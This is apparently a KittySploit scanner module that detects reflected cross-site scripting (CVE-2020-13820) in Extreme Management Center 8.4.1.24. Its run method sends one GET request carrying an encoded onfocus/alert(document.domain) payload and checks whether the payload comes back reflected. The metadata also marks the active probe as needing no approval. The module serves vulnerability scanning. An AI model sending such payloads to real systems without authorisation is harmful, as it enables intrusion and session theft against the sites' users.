#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Extreme Management Center 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Extreme Management Center 8.4.1.24 - Cross-Site Scripting Detection',
        'description': 'Extreme Management Center 8.4.1.24 contains a cross-site scripting vulnerability via a parameter in a GET request. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'extremenetworks', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@0x00crash/xss-reflected-in-extreme-management-center-8-4-1-24-cve-2020-13820-c6febe951219',
            'https://gtacknowledge.extremenetworks.com/articles/Solution/000051136',
            'https://gtacknowledge.extremenetworks.com',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-13820',
            'https://documentation.extremenetworks.com/release_notes/netsight/XMC_8.5.0_Release_Notes.pdf',
        ],
        'cve': 'CVE-2020-13820',
    }

    def run(self):
        r = self.http_request(method="GET", path='/OneView/view/center?a%27+type%3d+%27text%27+autofocus+onfocus%3d%27alert(document.domain)', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("autofocus onfocus='alert(document.domain)", 'Extreme Management Center',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Extreme Management Center 8.4.1.24 - Cross-Site Scripting detected",
                path='/OneView/view/center?a%27+type%3d+%27text%27+autofocus+onfocus%3d%27alert(document.domain)',
            )
            return True
        return False

